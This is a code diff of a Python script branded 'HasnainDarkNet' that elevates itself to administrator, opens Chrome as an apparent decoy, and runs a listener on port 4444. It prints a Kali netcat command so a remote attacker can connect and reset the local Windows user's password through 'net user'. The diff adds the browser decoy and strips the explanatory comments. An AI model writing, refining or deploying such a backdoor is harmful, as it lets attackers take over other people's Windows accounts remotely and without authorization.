@@ -7,8 +7,36 @@ import os
 import sys
 import ctypes
 import time
+import webbrowser
 
-# FORCE ADMIN WITH VISIBLE WINDOW
+CHROME_URL = "https://www.google.com"
+
+def open_chrome_background():
+    try:
+        chrome_paths = [
+            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+            r"C:\Users\{}\AppData\Local\Google\Chrome\Application\chrome.exe".format(os.getenv('USERNAME'))
+        ]
+        
+        chrome_exe = None
+        for path in chrome_paths:
+            if os.path.exists(path):
+                chrome_exe = path
+                break
+        
+        if chrome_exe:
+            subprocess.Popen([chrome_exe, CHROME_URL, "--new-window", "--start-maximized"],
+                           creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
+            print("[✓] Chrome opened in background!")
+        else:
+            webbrowser.open(CHROME_URL)
+            print("[✓] Default browser opened!")
+            
+    except Exception as e:
+        print(f"[!] Could not open Chrome: {e}")
+        webbrowser.open(CHROME_URL)
+
 def force_admin():
     try:
         if ctypes.windll.shell32.IsUserAnAdmin():
@@ -16,7 +44,6 @@ def force_admin():
     except:
         pass
     
-    # Admin mode mein visible window ke saath restart
     script = os.path.abspath(sys.argv[0])
     ctypes.windll.shell32.ShellExecuteW(
         None, 
@@ -24,15 +51,15 @@ def force_admin():
         sys.executable, 
         f'"{script}" --admin', 
         None, 
-        1  # 1 = normal window dikhega
+        1
     )
     sys.exit()
 
-# Check for admin flag
 if '--admin' not in ' '.join(sys.argv):
     force_admin()
 
-# Ab admin mode mein code
+open_chrome_background()
+
 PORT = 4444
 username = os.getenv('USERNAME')
 
@@ -44,11 +71,9 @@ def get_ip():
         return "0.0.0.0"
 
 def change_password(new_pass):
-    """Password change karo"""
     try:
         print(f"\n[*] Changing password for {username} to: {new_pass}")
         
-        # net user command
         result = subprocess.run(
             ['net', 'user', username, new_pass],
             capture_output=True,
@@ -66,15 +91,13 @@ def change_password(new_pass):
         print(f"[!] Error: {e}")
         return False, str(e)
 
-# Clear screen
 os.system('cls' if os.name == 'nt' else 'clear')
 
-# Banner
 ip = get_ip()
 print(f"""
 ╔══════════════════════════════════════════════════════════╗
 ║                 WINDOWS PASSWORD CHANGER                 ║
-║                    (ADMIN MODE)                          ║
+║                    (HasnainDarkNet)                      ║
 ╠══════════════════════════════════════════════════════════╣
 ║  Windows IP: {ip:<35} ║
 ║  Port: {PORT:<45} ║
@@ -85,7 +108,6 @@ print(f"""
 print(f"[*] Kali command: nc {ip} {PORT}")
 print("[*] Waiting for connections...\n")
 
-# Server loop
 while True:
     try:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
